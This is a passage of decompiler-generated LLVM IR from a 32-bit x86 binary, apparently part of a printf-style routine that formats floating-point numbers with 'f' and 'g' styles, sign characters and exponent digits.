  %v4_80542fa = load i32, i32* %edx.global-to-local, align 4
  %v5_80542fa = and i32 %v4_80542fa, -256
  %v6_80542fa = or i32 %v5_80542fa, %v3_80542fa
  store i32 %v6_80542fa, i32* %edx.global-to-local, align 4
  %v7_80542fc = icmp eq i8 %v2_80542fa, 48
  br i1 %v7_80542fc, label %dec_label_pc_80542f7.backedge, label %dec_label_pc_8054301

dec_label_pc_80542f7.backedge:                    ; preds = %dec_label_pc_80542f7, %dec_label_pc_8054301
  %v3_80542f8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80542f7

dec_label_pc_8054301:                             ; preds = %dec_label_pc_80542f7
  %v2_8054301 = add i8 %v2_80542fa, -57
  %v7_8054301 = sub i8 56, %v2_80542fa
  %v8_8054301 = and i8 %v7_8054301, %v2_80542fa
  %v9_8054301 = icmp slt i8 %v8_8054301, 0
  %v10_8054301 = icmp eq i8 %v2_8054301, 0
  %v11_8054301 = icmp slt i8 %v2_8054301, 0
  %v3_8054304 = icmp eq i1 %v11_8054301, %v9_8054301
  %v4_8054304 = icmp eq i1 %v10_8054301, false
  %v5_8054304 = and i1 %v4_8054304, %v3_8054304
  br i1 %v5_8054304, label %dec_label_pc_80542f7.backedge, label %dec_label_pc_8054306

dec_label_pc_8054306:                             ; preds = %dec_label_pc_8054301
  %v2_8054306 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8054306, i32* %eax.global-to-local, align 4
  %tmp146 = icmp ugt i32 %v0_80542fa, %v2_8054306
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp146, label %dec_label_pc_8054311, label %dec_label_pc_805431e

dec_label_pc_8054311:                             ; preds = %dec_label_pc_8054306
  store i32 %v2_80541f3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054327

dec_label_pc_805431e:                             ; preds = %dec_label_pc_8054306
  store i32 %v2_8054306, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8054306, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054327

dec_label_pc_8054327:                             ; preds = %dec_label_pc_8054311, %dec_label_pc_805431e
  %v0_8054327 = phi i32 [ %v0_80542fa, %dec_label_pc_8054311 ], [ %v2_8054306, %dec_label_pc_805431e ]
  %v1_8054327 = add i32 %v0_8054327, 1
  store i32 %v1_8054327, i32* %eax.global-to-local, align 4
  %v2_805432e = inttoptr i32 %v1_8054327 to i8*
  store i8 0, i8* %v2_805432e, align 1
  br i1 %v1_8054282, label %dec_label_pc_8054354, label %dec_label_pc_8054339

dec_label_pc_8054339:                             ; preds = %dec_label_pc_8054327
  %v0_8054339 = load i32, i32* %esi.global-to-local, align 4
  %v5_805433c = icmp slt i32 %v0_8054339, -4
  br i1 %v5_805433c, label %dec_label_pc_8054361, label %dec_label_pc_805433e

dec_label_pc_805433e:                             ; preds = %dec_label_pc_8054339
  %v1_805433e = load i32, i32* %ebx.global-to-local, align 4
  %v7_8054340 = icmp slt i32 %v1_805433e, %v0_8054339
  br i1 %v7_8054340, label %dec_label_pc_8054361, label %dec_label_pc_8054349

dec_label_pc_8054349:                             ; preds = %dec_label_pc_805433e
  %v2_8054350 = sub i32 %v1_805433e, %v0_8054339
  store i32 %v2_8054350, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054365

dec_label_pc_8054354:                             ; preds = %dec_label_pc_8054327
  %v4_8054354 = zext i8 %stack_var_-206.0.v4_8054270 to i32
  %v5_8054354 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8054354 = and i32 %v5_8054354, -256
  %v7_8054354 = or i32 %v6_8054354, %v4_8054354
  store i32 %v7_8054354, i32* %ecx.global-to-local, align 4
  %v10_805435c = icmp eq i8 %stack_var_-206.0.v4_8054270, 102
  br i1 %v10_805435c, label %dec_label_pc_8054354.dec_label_pc_8054365_crit_edge, label %dec_label_pc_8054361

dec_label_pc_8054354.dec_label_pc_8054365_crit_edge: ; preds = %dec_label_pc_8054354
  %v0_8054365.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054365

dec_label_pc_8054361:                             ; preds = %dec_label_pc_8054339, %dec_label_pc_805433e, %dec_label_pc_8054354
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.0.v4_8054270, %dec_label_pc_8054354 ], [ 103, %dec_label_pc_805433e ], [ 103, %dec_label_pc_8054339 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805436f

dec_label_pc_8054365:                             ; preds = %dec_label_pc_8054354.dec_label_pc_8054365_crit_edge, %dec_label_pc_8054349
  %v0_8054365 = phi i32 [ %v0_8054365.pre, %dec_label_pc_8054354.dec_label_pc_8054365_crit_edge ], [ %v0_8054339, %dec_label_pc_8054349 ]
  store i32 %v0_8054365, i32* %ebx.global-to-local, align 4
  %v2_8054367 = icmp slt i32 %v0_8054365, 0
  %v1_8054369 = icmp eq i1 %v2_8054367, false
  br i1 %v1_8054369, label %dec_label_pc_805436f, label %dec_label_pc_805436b

dec_label_pc_805436b:                             ; preds = %dec_label_pc_8054365
  %v0_805436b = load i32, i32* %edx.global-to-local, align 4
  %v1_805436b = add i32 %v0_805436b, -1
  store i32 %v1_805436b, i32* %edx.global-to-local, align 4
  %v1_805436c = inttoptr i32 %v1_805436b to i8*
  store i8 48, i8* %v1_805436c, align 1
  %v0_80543a4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805436f

dec_label_pc_805436f:                             ; preds = %dec_label_pc_8054365, %dec_label_pc_8054361, %dec_label_pc_805436b
  %v1_80543ff = phi i32 [ %v0_8054365, %dec_label_pc_8054365 ], [ %v0_80543a4.pre, %dec_label_pc_805436b ], [ 0, %dec_label_pc_8054361 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8054365 ], [ 102, %dec_label_pc_805436b ], [ %stack_var_-197.0, %dec_label_pc_8054361 ]
  %v2_805436f = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_805436f, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_805438a = load i32, i32* %edx.global-to-local, align 4
  %v1_805438a = inttoptr i32 %v0_805438a to i8*
  %v2_805438a = load i8, i8* %v1_805438a, align 1
  %v3_805438a = zext i8 %v2_805438a to i32
  %v5_805438a = and i32 %v2_805436f, -256
  %v6_805438a = or i32 %v3_805438a, %v5_805438a
  store i32 %v6_805438a, i32* %eax.global-to-local, align 4
  %v1_805438c = add i32 %v0_805438a, 1
  store i32 %v1_805438c, i32* %edi.global-to-local, align 4
  store i32 %v6_805438a, i32* %stack_var_-22, align 4
  %v2_805439a = sub i32 %v1_8054327, %v1_805438c
  store i32 %v2_805439a, i32* %edx.global-to-local, align 4
  %v1_80543a4 = icmp eq i32 %v1_80543ff, 0
  %v2_80543a4 = icmp slt i32 %v1_80543ff, 0
  br i1 %v2_80543a4, label %dec_label_pc_80543f3, label %dec_label_pc_80543a8

dec_label_pc_80543a8:                             ; preds = %dec_label_pc_805436f
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80543b4 = sub i32 %v1_80543ff, %v2_805439a
  %v8_80543b4 = xor i32 %v2_805439a, %v1_80543ff
  %v9_80543b4 = xor i32 %v2_80543b4, %v1_80543ff
  %v10_80543b4 = and i32 %v9_80543b4, %v8_80543b4
  %v11_80543b4 = icmp slt i32 %v10_80543b4, 0
  %v13_80543b4 = icmp slt i32 %v2_80543b4, 0
  %v2_80543b6 = icmp eq i1 %v13_80543b4, %v11_80543b4
  br i1 %v2_80543b6, label %dec_label_pc_80543b8, label %dec_label_pc_80543ec

dec_label_pc_80543b8:                             ; preds = %dec_label_pc_80543a8
  store i32 %v2_80543b4, i32* %eax.global-to-local, align 4
  %tmp137 = icmp slt i32 %v2_80543b4, 1
  %tmp138 = icmp eq i1 %tmp137, false
  br i1 %tmp138, label %dec_label_pc_80543cd, label %dec_label_pc_80543e8

dec_label_pc_80543cd:                             ; preds = %dec_label_pc_80543b8
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_80543e8

dec_label_pc_80543e8:                             ; preds = %dec_label_pc_80543b8, %dec_label_pc_80543cd
  %storemerge9.in = phi i32* [ %stack_var_-120, %dec_label_pc_80543cd ], [ %stack_var_-132, %dec_label_pc_80543b8 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge9 = ptrtoint i32* %storemerge9.in to i32
  store i32 %storemerge9, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054408

dec_label_pc_80543ec:                             ; preds = %dec_label_pc_80543a8
  %v4_80543ee = icmp eq i1 %v1_80543a4, false
  br i1 %v4_80543ee, label %dec_label_pc_80543f9, label %dec_label_pc_80543f0

dec_label_pc_80543f0:                             ; preds = %dec_label_pc_80543ec
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543f3

dec_label_pc_80543f3:                             ; preds = %dec_label_pc_805436f, %dec_label_pc_80543f0
  %v0_805443b72 = phi i32 [ %v1_80543ff, %dec_label_pc_805436f ], [ -1, %dec_label_pc_80543f0 ]
  %v2_80543f3 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80543f3, i32* @ecx, align 4
  br label %dec_label_pc_8054408

dec_label_pc_80543f9:                             ; preds = %dec_label_pc_80543ec
  %v2_80543fd = add i32 %v1_805438c, %v1_80543ff
  store i32 %v2_80543fd, i32* %edi.global-to-local, align 4
  %v2_80543ff = sub i32 %v2_805439a, %v1_80543ff
  store i32 %v2_80543ff, i32* %edx.global-to-local, align 4
  %v2_8054401 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8054401, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054408

dec_label_pc_8054408:                             ; preds = %dec_label_pc_80543f3, %dec_label_pc_80543e8, %dec_label_pc_80543f9
  %v0_805443b71 = phi i32 [ %v0_805443b72, %dec_label_pc_80543f3 ], [ -1, %dec_label_pc_80543e8 ], [ -1, %dec_label_pc_80543f9 ]
  %v0_8054424 = phi i32 [ %v2_80543f3, %dec_label_pc_80543f3 ], [ %storemerge9, %dec_label_pc_80543e8 ], [ %v2_8054401, %dec_label_pc_80543f9 ]
  %v0_8054415 = phi i32 [ %v2_805439a, %dec_label_pc_80543f3 ], [ 0, %dec_label_pc_80543e8 ], [ %v2_80543ff, %dec_label_pc_80543f9 ]
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v2_805440f = inttoptr i32 %v1_8054067 to i8*
  %v3_805440f = load i8, i8* %v2_805440f, align 1
  %v4_805440f = and i8 %v3_805440f, 16
  %v5_805440f = icmp eq i8 %v4_805440f, 0
  %v1_8054413 = icmp eq i1 %v5_805440f, false
  br i1 %v1_8054413, label %dec_label_pc_8054424, label %dec_label_pc_8054415

dec_label_pc_8054415:                             ; preds = %dec_label_pc_8054408
  %v1_8054415 = icmp eq i32 %v0_8054415, 0
  %v1_8054417 = icmp eq i1 %v1_8054415, false
  br i1 %v1_8054417, label %dec_label_pc_8054424, label %dec_label_pc_8054419

dec_label_pc_8054419:                             ; preds = %dec_label_pc_8054415
  br i1 %v12_805427d, label %dec_label_pc_805443b, label %dec_label_pc_8054420

dec_label_pc_8054420:                             ; preds = %dec_label_pc_8054419
  %v0_8054420 = load i32, i32* %ebp.global-to-local, align 4
  %tmp139 = icmp slt i32 %v0_8054420, 1
  br i1 %tmp139, label %dec_label_pc_805443b, label %dec_label_pc_8054424

dec_label_pc_8054424:                             ; preds = %dec_label_pc_8054420, %dec_label_pc_8054415, %dec_label_pc_8054408
  %v1_8054424 = inttoptr i32 %v0_8054424 to i32*
  store i32 112, i32* %v1_8054424, align 4
  %v0_805442a = load i32, i32* @ecx, align 4
  %v1_805442a = add i32 %v0_805442a, 4
  %v2_805442a = inttoptr i32 %v1_805442a to i32*
  store i32 1, i32* %v2_805442a, align 4
  %v0_8054431 = load i32, i32* @ecx, align 4
  %v1_8054431 = add i32 %v0_8054431, 8
  %v2_8054431 = inttoptr i32 %v1_8054431 to i32*
  store i32 ptrtoint (i32* @global_var_805c860.394 to i32), i32* %v2_8054431, align 4
  %v0_8054438 = load i32, i32* @ecx, align 4
  %v1_8054438 = add i32 %v0_8054438, 12
  store i32 %v1_8054438, i32* @ecx, align 4
  %v0_805443b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805443b

dec_label_pc_805443b:                             ; preds = %dec_label_pc_8054420, %dec_label_pc_8054419, %dec_label_pc_8054424
  %v0_8054440 = phi i32 [ %v0_8054424, %dec_label_pc_8054420 ], [ %v0_8054424, %dec_label_pc_8054419 ], [ %v1_8054438, %dec_label_pc_8054424 ]
  %v0_805443b = phi i32 [ %v0_805443b71, %dec_label_pc_8054420 ], [ %v0_805443b71, %dec_label_pc_8054419 ], [ %v0_805443b.pre, %dec_label_pc_8054424 ]
  %v1_805443b = add i32 %v0_805443b, 1
  %v8_805443b = icmp eq i32 %v1_805443b, 0
  store i32 %v1_805443b, i32* %ebx.global-to-local, align 4
  br i1 %v8_805443b, label %dec_label_pc_8054455, label %dec_label_pc_805443e

dec_label_pc_805443e:                             ; preds = %dec_label_pc_805443b
  store i32 %v1_805443b, i32* %eax.global-to-local, align 4
  %v1_8054440 = inttoptr i32 %v0_8054440 to i32*
  store i32 176, i32* %v1_8054440, align 4
  %v0_8054446 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054446 = sub i32 0, %v0_8054446
  store i32 %v1_8054446, i32* %eax.global-to-local, align 4
  %v1_8054448 = load i32, i32* @ecx, align 4
  %v2_8054448 = add i32 %v1_8054448, 4
  %v3_8054448 = inttoptr i32 %v2_8054448 to i32*
  store i32 %v1_8054446, i32* %v3_8054448, align 4
  %v0_805444b = load i32, i32* @ecx, align 4
  %v1_805444b = add i32 %v0_805444b, 8
  %v2_805444b = inttoptr i32 %v1_805444b to i32*
  store i32 ptrtoint (i32* @global_var_805c853.393 to i32), i32* %v2_805444b, align 4
  %v0_8054452 = load i32, i32* @ecx, align 4
  %v1_8054452 = add i32 %v0_8054452, 12
  store i32 %v1_8054452, i32* @ecx, align 4
  br label %dec_label_pc_8054455

dec_label_pc_8054455:                             ; preds = %dec_label_pc_805443b, %dec_label_pc_805443e
  %v0_8054459 = phi i32 [ %v0_8054440, %dec_label_pc_805443b ], [ %v1_8054452, %dec_label_pc_805443e ]
  %v0_8054455 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054455 = icmp eq i32 %v0_8054455, 0
  br i1 %v1_8054455, label %dec_label_pc_8054468, label %dec_label_pc_8054459

dec_label_pc_8054459:                             ; preds = %dec_label_pc_8054455
  %v1_8054459 = inttoptr i32 %v0_8054459 to i32*
  store i32 112, i32* %v1_8054459, align 4
  %v0_805445f = load i32, i32* %edx.global-to-local, align 4
  %v1_805445f = load i32, i32* @ecx, align 4
  %v2_805445f = add i32 %v1_805445f, 4
  %v3_805445f = inttoptr i32 %v2_805445f to i32*
  store i32 %v0_805445f, i32* %v3_805445f, align 4
  %v0_8054462 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054462 = load i32, i32* @ecx, align 4
  %v2_8054462 = add i32 %v1_8054462, 8
  %v3_8054462 = inttoptr i32 %v2_8054462 to i32*
  store i32 %v0_8054462, i32* %v3_8054462, align 4
  %v0_8054465 = load i32, i32* @ecx, align 4
  %v1_8054465 = add i32 %v0_8054465, 12
  store i32 %v1_8054465, i32* @ecx, align 4
  br label %dec_label_pc_8054468

dec_label_pc_8054468:                             ; preds = %dec_label_pc_8054455, %dec_label_pc_8054459
  %v0_8054486 = phi i32 [ %v0_8054459, %dec_label_pc_8054455 ], [ %v1_8054465, %dec_label_pc_8054459 ]
  br i1 %v1_8054282, label %dec_label_pc_805447c, label %dec_label_pc_805446f

dec_label_pc_805446f:                             ; preds = %dec_label_pc_8054468
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v3_8054476 = load i8, i8* %v2_805440f, align 1
  %v4_8054476 = and i8 %v3_8054476, 16
  %v5_8054476 = icmp eq i8 %v4_8054476, 0
  br i1 %v5_8054476, label %dec_label_pc_8054499, label %dec_label_pc_805447c

dec_label_pc_805447c:                             ; preds = %dec_label_pc_805446f, %dec_label_pc_8054468
  %v0_805447c = load i32, i32* %edx.global-to-local, align 4
  %v1_805447e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805447e = sub i32 %v0_805447c, %v1_805447e
  store i32 %v2_805447e, i32* %eax.global-to-local, align 4
  %v1_8054480 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054480 = sub i32 %v2_805447e, %v1_8054480
  %v8_8054480 = xor i32 %v1_8054480, %v2_805447e
  %v9_8054480 = xor i32 %v2_8054480, %v2_805447e
  %v10_8054480 = and i32 %v9_8054480, %v8_8054480
  %v11_8054480 = icmp slt i32 %v10_8054480, 0
  %v13_8054480 = icmp slt i32 %v2_8054480, 0
  %v2_8054482 = icmp eq i1 %v13_8054480, %v11_8054480
  br i1 %v2_8054482, label %dec_label_pc_8054499, label %dec_label_pc_8054484

dec_label_pc_8054484:                             ; preds = %dec_label_pc_805447c
  %v2_8054484 = sub i32 %v1_8054480, %v2_805447e
  store i32 %v2_8054484, i32* %ebp.global-to-local, align 4
  %v1_8054486 = inttoptr i32 %v0_8054486 to i32*
  store i32 176, i32* %v1_8054486, align 4
  %v0_805448c = load i32, i32* %ebp.global-to-local, align 4
  %v1_805448c = load i32, i32* @ecx, align 4
  %v2_805448c = add i32 %v1_805448c, 4
  %v3_805448c = inttoptr i32 %v2_805448c to i32*
  store i32 %v0_805448c, i32* %v3_805448c, align 4
  %v0_805448f = load i32, i32* @ecx, align 4
  %v1_805448f = add i32 %v0_805448f, 8
  %v2_805448f = inttoptr i32 %v1_805448f to i32*
  store i32 ptrtoint (i32* @global_var_805c853.393 to i32), i32* %v2_805448f, align 4
  %v0_8054496 = load i32, i32* @ecx, align 4
  %v1_8054496 = add i32 %v0_8054496, 12
  store i32 %v1_8054496, i32* @ecx, align 4
  br label %dec_label_pc_8054499

dec_label_pc_8054499:                             ; preds = %dec_label_pc_805447c, %dec_label_pc_805446f, %dec_label_pc_8054484
  %v1_805451c83 = phi i32 [ %v0_8054486, %dec_label_pc_805447c ], [ %v0_8054486, %dec_label_pc_805446f ], [ %v1_8054496, %dec_label_pc_8054484 ]
  %v12_8054499 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8054499, label %dec_label_pc_805450f, label %dec_label_pc_80544a0

dec_label_pc_80544a0:                             ; preds = %dec_label_pc_8054499
  %v0_80544a7 = load i32, i32* %esi.global-to-local, align 4
  %v2_80544a7 = icmp slt i32 %v0_80544a7, 0
  %v1_80544a9 = trunc i32 %.143 to i8
  store i32 %v0_80544a7, i32* %edx.global-to-local, align 4
  br i1 %v2_80544a7, label %dec_label_pc_80544b8, label %dec_label_pc_80544af

dec_label_pc_80544af:                             ; preds = %dec_label_pc_80544a0
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80544c1

dec_label_pc_80544b8:                             ; preds = %dec_label_pc_80544a0
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_80544bf = sub i32 0, %v0_80544a7
  store i32 %v1_80544bf, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544c1

dec_label_pc_80544c1:                             ; preds = %dec_label_pc_80544af, %dec_label_pc_80544b8
  %v0_80544d576 = phi i32 [ %v0_80544a7, %dec_label_pc_80544af ], [ %v1_80544bf, %dec_label_pc_80544b8 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80544c9 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80544c9, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80544d5

dec_label_pc_80544d5:                             ; preds = %dec_label_pc_80544d5.backedge, %dec_label_pc_80544c1
  %v0_80544e3 = phi i32 [ %v0_80544e6, %dec_label_pc_80544d5.backedge ], [ 2, %dec_label_pc_80544c1 ]
  %v0_80544df = phi i32 [ %v0_80544df.pre, %dec_label_pc_80544d5.backedge ], [ %v2_80544c9, %dec_label_pc_80544c1 ]
  %v0_80544d5 = phi i32 [ %v9_80544dd, %dec_label_pc_80544d5.backedge ], [ %v0_80544d576, %dec_label_pc_80544c1 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_80544dc = ashr i32 %v0_80544d5, 31
  %v2_80544dd = zext i32 %v0_80544d5 to i64
  %v4_80544dd = zext i32 %v1_80544dc to i64
  %v5_80544dd = mul nuw i64 %v4_80544dd, 4294967296
  %v6_80544dd = or i64 %v5_80544dd, %v2_80544dd
  %v8_80544dd = sdiv i64 %v6_80544dd, 10
  %v9_80544dd = trunc i64 %v8_80544dd to i32
  store i32 %v9_80544dd, i32* %eax.global-to-local, align 4
  %v11_80544dd = srem i64 %v6_80544dd, 10
  %v12_80544dd = trunc i64 %v11_80544dd to i8
  %v1_80544df = add i32 %v0_80544df, -1
  store i32 %v1_80544df, i32* %ebx.global-to-local, align 4
  %v1_80544e0 = add i8 %v12_80544dd, 48
  %v1_80544e3 = add i32 %v0_80544e3, 1
  store i32 %v1_80544e3, i32* %esi.global-to-local, align 4
  %v3_80544e4 = inttoptr i32 %v1_80544df to i8*
  store i8 %v1_80544e0, i8* %v3_80544e4, align 1
  %v0_80544e6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_80544dd, i32* %edx.global-to-local, align 4
  %v7_80544eb = icmp sgt i32 %v0_80544e6, 3
  br i1 %v7_80544eb, label %dec_label_pc_80544ed, label %dec_label_pc_80544d5.backedge

dec_label_pc_80544ed:                             ; preds = %dec_label_pc_80544d5
  %v2_80544ed = icmp eq i32 %v9_80544dd, 0
  %v1_80544ef = icmp eq i1 %v2_80544ed, false
  br i1 %v1_80544ef, label %dec_label_pc_80544d5.backedge, label %dec_label_pc_80544f1

dec_label_pc_80544d5.backedge:                    ; preds = %dec_label_pc_80544ed, %dec_label_pc_80544d5
  %v0_80544df.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80544d5

dec_label_pc_80544f1:                             ; preds = %dec_label_pc_80544ed
  %v0_80544f1 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80544f1, i32* %edx.global-to-local, align 4
  %v0_80544f3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80544f3 = add i32 %v0_80544f3, -2
  store i32 %v1_80544f3, i32* %eax.global-to-local, align 4
  %v1_80544f6 = trunc i32 %v0_80544f1 to i8
  %v3_80544f6 = add i32 %v0_80544f3, -1
  %v4_80544f6 = inttoptr i32 %v3_80544f6 to i8*
  store i8 %v1_80544f6, i8* %v4_80544f6, align 1
  %v5_80544f9 = load i32, i32* %edx.global-to-local, align 4
  %v6_80544f9 = and i32 %v5_80544f9, -256
  %v7_80544f9 = or i32 %v6_80544f9, %.143
  store i32 %v7_80544f9, i32* %edx.global-to-local, align 4
  %v2_80544fd = load i32, i32* %ebx.global-to-local, align 4
  %v3_80544fd = add i32 %v2_80544fd, -2
  %v4_80544fd = inttoptr i32 %v3_80544fd to i8*
  store i8 %v1_80544a9, i8* %v4_80544fd, align 1
  %v0_8054500 = load i32, i32* @ecx, align 4
  %v1_8054500 = inttoptr i32 %v0_8054500 to i32*
  store i32 112, i32* %v1_8054500, align 4
  %v0_8054506 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054506 = load i32, i32* @ecx, align 4
  %v2_8054506 = add i32 %v1_8054506, 4
  %v3_8054506 = inttoptr i32 %v2_8054506 to i32*
  store i32 %v0_8054506, i32* %v3_8054506, align 4
  %v0_8054509 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054509 = load i32, i32* @ecx, align 4
  %v2_8054509 = add i32 %v1_8054509, 8
  %v3_8054509 = inttoptr i32 %v2_8054509 to i32*
  store i32 %v0_8054509, i32* %v3_8054509, align 4
  %v0_805450c = load i32, i32* @ecx, align 4
  %v1_805450c = add i32 %v0_805450c, 12
  store i32 %v1_805450c, i32* @ecx, align 4
  br label %dec_label_pc_805450f

dec_label_pc_805450f:                             ; preds = %dec_label_pc_8054499, %dec_label_pc_805410a, %dec_label_pc_80544f1
  %v0_8054590 = phi i32 [ %v1_805451c83, %dec_label_pc_8054499 ], [ %v2_805413c, %dec_label_pc_805410a ], [ %v1_805450c, %dec_label_pc_80544f1 ]
  %v2_805450f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805450f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054513

dec_label_pc_8054513:                             ; preds = %dec_label_pc_8054513, %dec_label_pc_805450f
  %v0_8054513 = phi i32 [ %v2_805450f, %dec_label_pc_805450f ], [ %v1_8054515, %dec_label_pc_8054513 ]
  %stack_var_-216.0 = phi i32 [ %v3_8054027, %dec_label_pc_805450f ], [ %v5_8054518, %dec_label_pc_8054513 ]
  %v1_8054513 = inttoptr i32 %v0_8054513 to i32*
  %v2_8054513 = load i32, i32* %v1_8054513, align 4
  store i32 %v2_8054513, i32* %edx.global-to-local, align 4
  %v1_8054515 = add i32 %v0_8054513, 12
  store i32 %v1_8054515, i32* %eax.global-to-local, align 4
  %v5_8054518 = sub i32 %stack_var_-216.0, %v2_8054513
  %v7_805451c = icmp ult i32 %v1_8054515, %v0_8054590
  br i1 %v7_805451c, label %dec_label_pc_8054513, label %dec_label_pc_8054520

dec_label_pc_8054520:                             ; preds = %dec_label_pc_8054513
  %v5_8054529 = icmp eq i8 %stack_var_-26.0, 0
  %v1_8054539 = icmp eq i1 %v5_8054529, false
  %v2_8054539 = zext i1 %v1_8054539 to i32
  %v2_805453c = sub i32 %v5_8054518, %v2_8054539
  store i32 %v2_805453c, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_805453c, i32* %eax.global-to-local, align 4
  store i32 %v0_8054590, i32* %esi.global-to-local, align 4
  %tmp140 = icmp slt i32 %v2_805453c, 1
  br i1 %tmp140, label %dec_label_pc_8054592, label %dec_label_pc_8054552

dec_label_pc_8054552:                             ; preds = %dec_label_pc_8054520
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v2_8054559 = inttoptr i32 %v1_8054067 to i8*
  %v3_8054559 = load i8, i8* %v2_8054559, align 1
  %v4_8054559 = and i8 %v3_8054559, 8
  %v5_8054559 = icmp eq i8 %v4_8054559, 0
  br i1 %v5_8054559, label %dec_label_pc_8054574, label %dec_label_pc_805455f

dec_label_pc_805455f:                             ; preds = %dec_label_pc_8054552
  %v1_805455f = add i32 %v0_8054590, 12
  store i32 %v1_805455f, i32* %esi.global-to-local, align 4
  %v1_8054562 = inttoptr i32 %v0_8054590 to i32*
  store i32 160, i32* %v1_8054562, align 4
  %v0_8054568 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054568 = load i32, i32* @ecx, align 4
  %v2_8054568 = add i32 %v1_8054568, 4
  %v3_8054568 = inttoptr i32 %v2_8054568 to i32*
  store i32 %v0_8054568, i32* %v3_8054568, align 4
  %v0_805456b = load i32, i32* @ecx, align 4
  %v1_805456b = add i32 %v0_805456b, 8
  %v2_805456b = inttoptr i32 %v1_805456b to i32*
  store i32 ptrtoint (i32* @global_var_805c853.393 to i32), i32* %v2_805456b, align 4
  br label %dec_label_pc_8054592

dec_label_pc_8054574:                             ; preds = %dec_label_pc_8054552
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_805457b = add i32 %tmp111, 16
  %v2_805457b = inttoptr i32 %v1_805457b to i32*
  %v3_805457b = load i32, i32* %v2_805457b, align 4
  %v9_805457b = icmp eq i32 %v3_805457b, 48
  %v1_805457f = icmp eq i1 %v9_805457b, false
  br i1 %v1_805457f, label %dec_label_pc_805458c, label %dec_label_pc_8054581

dec_label_pc_8054581:                             ; preds = %dec_label_pc_8054574
  %v3_8054581 = load i32, i32* %stack_var_-152, align 4
  %v5_8054581 = add i32 %v3_8054581, %v2_805453c
  store i32 %v5_8054581, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8054590

dec_label_pc_8054587:                             ; preds = %dec_label_pc_8054598
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80545bf

dec_label_pc_805458c:                             ; preds = %dec_label_pc_8054574
  br label %dec_label_pc_8054590

dec_label_pc_8054590:                             ; preds = %dec_label_pc_8054581, %dec_label_pc_805458c
  store i32 %v0_8054590, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054592

dec_label_pc_8054592:                             ; preds = %dec_label_pc_8054520, %dec_label_pc_805455f, %dec_label_pc_8054590
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8054594 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8054594, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054598

dec_label_pc_8054598:                             ; preds = %dec_label_pc_80545b6, %dec_label_pc_8054592
  call void @__pseudo_call(i32 %tmp111)
  %v0_80545b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80545b1 = add i32 %v1_80545b1, 4
  %v3_80545b1 = inttoptr i32 %v2_80545b1 to i32*
  %v4_80545b1 = load i32, i32* %v3_80545b1, align 4
  %v15_80545b1 = icmp eq i32 %v0_80545b1, %v4_80545b1
  %v1_80545b4 = icmp eq i1 %v15_80545b1, false
  br i1 %v1_80545b4, label %dec_label_pc_8054587, label %dec_label_pc_80545b6

dec_label_pc_80545b6:                             ; preds = %dec_label_pc_8054598
  %v1_80545b6 = add i32 %v1_80545b1, 12
  store i32 %v1_80545b6, i32* %ebx.global-to-local, align 4
  %v0_80545b9 = load i32, i32* %edi.global-to-local, align 4
